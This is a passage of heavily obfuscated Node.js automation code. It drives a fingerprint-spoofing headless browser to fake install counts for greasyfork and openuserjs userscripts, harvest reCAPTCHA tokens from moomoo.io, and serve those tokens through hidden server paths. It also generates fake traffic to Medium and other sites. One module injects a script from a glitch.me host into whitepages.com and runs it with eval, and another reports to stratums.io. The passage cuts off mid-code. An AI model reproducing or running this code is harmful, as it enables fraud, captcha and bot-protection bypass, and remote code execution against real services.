      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + X(0x12) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    Y(0x0, 'Q$FE') + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + X(0xe) + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + Z(0x1) + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + Z(0x14) + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + Z(0x15) + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2332 + -0x4b * 0x3 + 0xfb * -0x23
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x847 + 0x967 + -0x1 * 0x11ae)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xd7a + 0x6d9 * 0x3 + -0x21a1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x203e + -0x34a + 0x1 * -0x1c90), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1314 + 0x2246 + -0xf32;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1de * -0x4 + -0x160c + 0xe94; w < getRandomInt(0x1d * -0x156 + 0x1cd * 0x8 + 0x5d * 0x43, -0x4b1 * 0x3 + -0x186c + -0x14 * -0x1ed); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x3b1c + 0x5b17 * -0x2 + -0x16572 * -0x1);
        }
      }();
    }, 0x1e65 + -0x13d7 * -0x1 + -0x31d8), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x3 * -0x40b + 0x1cfb + 0x291c * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x12bf * -0x1 + -0xe2 * -0x5 + -0x1 * 0x1729, -0x228e + 0xe04 + 0x4 * 0x52f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4597 + -0xdb89 + 0x10b22);
    }, -0x251f + -0xfdf * -0x1 + 0x15a4), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x16b3 + -0x18e2 + 0x2b * 0xd;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x3 * -0x3a4 + 0x2 * -0x8da + -0x8 * -0x250), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1f8d * -0x1 + -0x2675 + 0x3a * 0x135), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x24a4a + -0x110082 + -0x8419b * -0x4);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x982 + -0x3b * 0xa9 + 0x30d9);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * -0xcfe + 0x6db + -0x1311);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x8 * 0x3f1 + 0x35fb * -0x1 + 0x3603);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a0 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1d1a + 0x1fba + -0x2a5 * 0x17) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x39 * 0x7f + -0x1777 + 0x33bf));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x116 * -0x16 + -0x2 * -0x1267 + -0x3cb2, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * -0x2351 + 0xf99 + 0x13b8, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * 0x44ed + -0x1 * -0x17a5 + 0x1516 * 0x4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x34bf + -0x2 * 0x157f + -0x1 * -0x86cd),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object[a0(0x4)](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x4f * -0x5 + 0x10dd * 0x1 + -0xf52; k < 0x19 * -0x11 + 0x4 * -0x5ff + 0x19a9 * 0x1; k++)
    setTimeout(f, (0x14f89 + -0x7259 * -0x2 + -0x149db) * k * getRandomInt(0x321 + 0xc0 * -0x11 + -0x8 * -0x134, 0xf06 + 0x1 * 0x68d + -0x2b2 * 0x8));
  setInterval(() => {
    f();
    for (let l = -0x1b68 + 0x49 * -0x7a + 0x346 * 0x13; l < 0x1bd9 + 0x1 * -0x35f + 0x65 * -0x3e; l++)
      setTimeout(f, (0x1 * 0x70ff + 0x10 * -0x4ab + 0xc411) * l * getRandomInt(-0x7de + -0x1821 + 0x2000, 0x607 * 0x6 + 0xb8f + 0x17db * -0x2));
  }, 0x1499b7 * -0x5 + 0x85 * 0x5eaa + -0x1 * -0x6cc0c1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
